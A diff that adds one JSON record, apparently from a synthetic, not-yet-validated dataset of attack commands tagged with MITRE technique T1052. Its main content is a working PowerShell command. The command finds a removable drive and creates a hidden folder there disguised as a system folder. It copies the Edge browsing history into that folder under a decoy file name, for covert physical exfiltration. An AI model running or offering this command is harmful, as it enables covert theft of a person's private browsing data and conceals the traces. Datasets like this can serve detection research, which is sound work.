@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1052",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$dl=(Get-Volume -DriveType Removable | Select -First 1 -Expand DriveLetter); $src=\"$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\History\"; $dest=\"$dl`:\\System Volume Information\"; New-Item -ItemType Directory -Force -Path $dest | Out-Null; attrib +h +s $dest; Copy-Item -Path $src -Destination (Join-Path $dest \"syscache.db\") -Force -ErrorAction SilentlyContinue; Write-Output \"Copied Edge history to removable media at $(Get-Date)\" | Out-File \"$dest\\op.log\" -Append",
+  "explanation": "Copies a browser history database to a hidden system-like folder on a removable drive for covert physical exfiltration.",
+  "rationale_steps": [
+    "Resolve removable drive letter",
+    "Create and hide a plausible system directory on USB",
+    "Copy the history database file to the USB device",
+    "Write a local log entry using Write-Output"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1052-a3760856-0532d394",
+  "source_prompt_hash": "a3760856",
+  "timestamp_utc": "2025-09-30T05:14:51.683873Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
